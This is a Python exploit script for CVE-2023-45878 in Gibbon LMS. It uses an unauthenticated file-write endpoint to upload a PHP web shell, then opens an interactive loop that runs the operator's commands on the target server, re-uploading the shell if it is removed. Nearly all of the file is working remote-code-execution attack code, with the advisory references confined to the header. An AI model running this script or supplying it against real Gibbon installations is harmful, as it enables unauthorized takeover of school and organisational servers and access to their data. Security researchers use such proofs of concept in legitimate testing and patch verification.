#!/usr/bin/python3
# CVE-2023-45878
# Gibbon LMS <= 25.0.1 allows arbitrary file write because the
# rubrics_visualise_saveAjax.php does not require authentication. The endpoint
# accepts the img, path, and gibbonPersonID parameters. The img parameter is
# expected to be a bas64 encoded image. If the path parameter is set, the
# defined path is used as the destination folder, concatenated with the
# absolute path of the installation directory. The content of the img parameter
# is base64 decoded and written to the defined file path. This allows creation
# of PHP files that permit unauthenticated Remove Code Execution (RCE).
#
# References: 
# https://herolab.usd.de/security-advisories/usd-2023-0025/
# https://nvd.nist.gov/vuln/detail/CVE-2023-45878
#
# This script will attempt to perform an arbitrary write to upload 
# a PHP webshell and then present user with an `interactive`` command prompt.

import requests, sys, base64, random, string

if len(sys.argv) != 2:
    print(f'Usage: python3 {sys.argv[0]} url')
    print(f'Example: python3 {sys.argv[0]} http://example.com')
    sys.exit(1)

# Upload the php webshell and return the filename
def upload_payload(url: string) -> string:
    payload = f'''<?php echo system($_GET['cmd'] . ' 2>&1');?>'''
    encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    file_name = ''.join(random.choices(string.ascii_letters, k=4))
    route = '/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php'
    data = {'img': f'image/png;{file_name},{encoded_payload}', 
        'path':f'{file_name}.php', 
        'gibbonPersonID':'0000000001'}
    req = requests.post(url+route,data=data)
    if req.status_code != 200:
        print(f'[-] Failed to upload web shell to {url+route}')
        sys.exit()
    
    print(f'[+] Successfully uploaded web shell to {url}/Gibbons-LMS/{file_name}.php')
    return file_name

url = sys.argv[1]
file_name = upload_payload(url)

print(f"[*] Here's your shell:")

while (True):
    cmd = input(f'{file_name}.php?cmd=> ')
    if cmd.rstrip('\n') == 'exit':
        print('Exiting...')
        sys.exit()
    response = requests.get(url+f'/Gibbon-LMS/{file_name}.php?cmd={cmd}')
    if len(response.text) != 0:
        if '404 Not Found' in response.text:
            print('[-] Server appears to have performed cleanup and payload is gone, re-establishing web shell.')
            file_name = upload_payload(url)
            print('[*] Resubmitting your command.')
            response = requests.get(url+f'/Gibbon-LMS/{file_name}.php?cmd={cmd}')
        
        print(response.text)
    else: print('[-] Something went wrong! :(')
